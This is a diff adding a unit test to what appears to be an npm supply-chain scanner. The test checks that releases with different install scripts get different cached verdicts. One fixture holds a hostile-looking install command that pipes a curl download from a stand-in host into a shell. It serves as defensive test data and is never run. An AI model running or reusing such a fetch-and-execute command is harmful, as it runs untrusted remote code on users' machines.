@@ -197,4 +197,17 @@ it('two packages with identical evidence do not share one verdict', () => {
   assert.equal(a, again, 'the key is not stable for one package');
 });
 
+it('two releases whose install scripts differ do not share a verdict; a diff with no install phase keeps its old key', () => {
+  const models = { triage: 'a', judge: 'b', second: 'c' };
+  const base = { pkg: 'ajv', severity: 'alarming', reasons: ['at install: spawns a shell or a downloader it did not spawn before'], strategy: 'nodert',
+    net: { added: [] }, dns: { added: [] }, fs: { added: [] }, env: { added: [] }, proc: { added: [] }, exec: { added: [] } };
+  const none = { added: [], removed: [] };
+  const inst = (argv) => ({ net: none, dns: none, fs: none, env: none, exec: none, proc: { added: [{ argv }], removed: [] } });
+  const a = keyFor({ diff: { ...base, install: inst(['sh', '-c', 'opencollective-postinstall']) }, models, record: null });
+  const b = keyFor({ diff: { ...base, install: inst(['sh', '-c', 'curl https://x.example | sh']) }, models, record: null });
+  assert.notEqual(a, b, 'different install scripts shared one cached answer');
+  // No install phase: exactly the key it always had (no install field enters the material).
+  assert.equal(keyFor({ diff: base, models, record: null }), keyFor({ diff: { ...base, install: undefined }, models, record: null }));
+});
+
 console.log(`\n${passed} passed`);
